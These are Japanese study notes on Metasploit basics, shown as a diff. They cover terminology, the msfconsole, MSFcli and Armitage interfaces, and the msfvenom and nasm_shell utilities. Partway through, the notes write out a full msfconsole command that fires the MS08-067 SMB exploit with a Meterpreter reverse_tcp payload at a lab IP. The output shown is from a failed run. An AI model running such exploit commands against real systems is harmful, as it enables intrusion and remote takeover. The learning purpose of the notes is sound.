@@ -1,0 +1,174 @@
+第2章 Metasploitの基本
+用語集
+・エクスプロイト
+  攻撃者やペネトレーションテスターがシステム、アプリ、サービス内の欠陥をたくみに利用すること。
+・ペイロード
+  システムに実行させたいコードであり、Frameworkによって選択され送り込まれる。
+  例えばリバースシェルなど。
+・シェルコード
+  エクスプロイトを実行するときペイロードとして用いられる命令セット。通常機械語。
+・モジュール
+  Metasploitが利用できるソフトウェア。
+  攻撃を実行するソフトウェアコンポーネントであるexploitモジュールが必要となる場合もある。
+  スキャンやシステム列挙などのアクションの場合はauxiliaryモジュールが必要となる。
+・リスナー
+  何らかの接続を待っているMetasploitのコンポーネント。
+
+Metasploitインターフェース
+・MSFconsole
+Metasploit Frameworkの中でも特に有名なもの。
+MSFconsoleはFrameworkの中でも最も柔軟性が高く機能が豊富。
+すべてのオプションと設定に対してオールインワンのインターフェースを提供してくれる。
+エクスプロイトの実行、auxiliary、リスナーの作成など全て出来る。
+常に変化はするがコマンドのサブセットはほぼ変わらない。
+なのでこの基本を習得しておけば変更に耐えられるはず。
+
+MSFconsoleの立ち上げ
+とりあえずconsoleでmsfconsoleと打ってみる。（kali Linux入れた）
+         .                                         .
+ .
+
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
+       '   dB'                     BBP
+    dB'dB'dB' dBBP     dBP     dBP BB
+   dB'dB'dB' dBP      dBP     dBP  BB
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
+          .                  .                  dB' dBP    dB'.BP
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+
+                                                                    .
+                .
+        o                  To boldly go where no
+                            shell has gone before
+
+
+       =[ metasploit v4.16.30-dev                         ]
++ -- --=[ 1722 exploits - 986 auxiliary - 300 post        ]
++ -- --=[ 507 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf >
+msf > help connect
+Usage: connect [options] <host> <port>
+
+Communicate with a host, similar to interacting via netcat, taking advantage of
+any configured session pivoting.
+
+OPTIONS:
+
+    -C        Try to use CRLF for EOL sequence.
+    -P <opt>  Specify source port.
+    -S <opt>  Specify source address.
+    -c <opt>  Specify which Comm to use.
+    -h        Help banner.
+    -i <opt>  Send the contents of a file.
+    -p <opt>  List of proxies to use.
+    -s        Connect with SSL.
+    -u        Switch to a UDP socket.
+    -w <opt>  Specify connect timeout.
+    -z        Just try to connect, then return.
+msf >
+
+・MSFcli
+MSFconsoleとは違ってスクリプティングとほかのコンソールベースのツールとの接続性を優先。
+コマンドラインから直接実行するため他のツールの出力をMSFcliにリダイレクトしたり
+出力を他のコマンドラインツールに直接渡したりすることが出来る。
+またexploitモジュールとauxiliaryモジュールの起動をサポートしているので
+モジュールのテストや新規エクスプロイト開発に向いている。
+→どうやら非推奨になったらしく以下のようなコマンドで実行できるっぽい
+msfconsole -x "use exploits/windows/smb/ms08_067_netapi"
+こまかいことはinfoを実行すると出てくる。
+実行できるモジュールは以下フォルダにあるっぽい。
+/usr/share/metasploit-framework/modules/exploits/
+
+実行してみた。
+root@kali:/usr/bin# msfconsole -x "use exploits/windows/smb/ms08_067_netapi; set RHOST 10.61.7.21; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.61.7.100;run"
+
+
+     .~+P``````-o+:.                                      -o+:.
+.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
++++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
+++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
+--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
+                                `...............`              `...-/////...`
+
+
+                                  .::::::::::-.                     .::::::-
+                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
+                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
+                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
+                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
+                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
+    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
+      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
+    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
+    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
+          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
+          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
+          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
+........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
+================================================================================
+=====================+--------------------------------+=========================
+=====================| Session one died of dysentery. |=========================
+=====================+--------------------------------+=========================
+================================================================================
+
+                     Press ENTER to size up the situation
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+                        Press SPACE BAR to continue
+
+
+
+       =[ metasploit v4.16.30-dev                         ]
++ -- --=[ 1722 exploits - 986 auxiliary - 300 post        ]
++ -- --=[ 507 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+RHOST => 10.61.7.21
+PAYLOAD => windows/meterpreter/reverse_tcp
+LHOST => 10.61.7.100
+[*] Started reverse TCP handler on 10.61.7.100:4444
+[-] 10.61.7.21:445 - Connection reset during login
+[-] 10.61.7.21:445 - This most likely means a previous exploit attempt caused the service to crash
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms08_067_netapi) >
+なんもないとこ相手なのでこんな感じになった。
+
+・Armitage
+ArmitageはGUI。インターフェイスとして機能豊富で無料。
+Frameworkを理解していれば非常に便利なツール。
+KaliLinuxでも問題なく起動確認済み。
+
+Metasploitのユーティリティ
+・MSFPayload
+Frameworkを使わずにエクスプロイトで使うようなシェルコードや実行ファイルを生成できる。
+シェルコードはC、Ruby、Javascript、VBAなど色々。
+攻撃対象によって使う言語を分けるのがよい。
+→現時点で非推奨のためkali Linuxには入っていなかった。
+→ついでにこの後に出てくるMSFencodeも消えてる。
+その移行先としてmsfvenomがあるみたい。どうやらmsfvenomでまとめたようになっているっぽい。
+
+・nasmシェル
+エクスプロイト開発において任意のアセンブリ命令のオペコードを調べるのに役立つ。
+以下実行サンプル。
+root@kali:/usr/bin# cd /usr/share/metasploit-framework/tools/exploit/
+root@kali:/usr/share/metasploit-framework/tools/exploit# ./nasm_shell.rb
+nasm > jmp esp
+00000000  FFE4              jmp esp
+nasm >
+
+Metasploit ExpressとMerasploit Pro
+Proの方が自動化機能が強い。なので自動化するメリットがあれば自動化を考えること。
+ただし攻撃ベクターの特定においては機械より人間の方が有能。
